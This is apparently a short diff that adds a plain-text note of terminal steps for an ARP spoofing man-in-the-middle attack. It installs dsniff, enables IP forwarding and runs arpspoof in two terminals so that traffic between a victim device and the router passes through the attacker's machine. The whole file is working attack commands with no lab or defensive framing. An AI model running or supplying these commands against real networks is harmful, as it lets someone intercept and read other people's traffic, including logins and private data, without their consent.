@@ -1,0 +1,12 @@
+write in terminal
+
+sudo apt install dsniff
+
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+Replace wlan0 with your real interface
+Terminal 1: Spoof victim 
+sudo arpspoof -i wlan0 -t <device_ip> <router/gateway ip>
+
+# Terminal 2: Spoof router
+sudo arpspoof -i wlan0 -t <router/gateway ip> <device_ip>
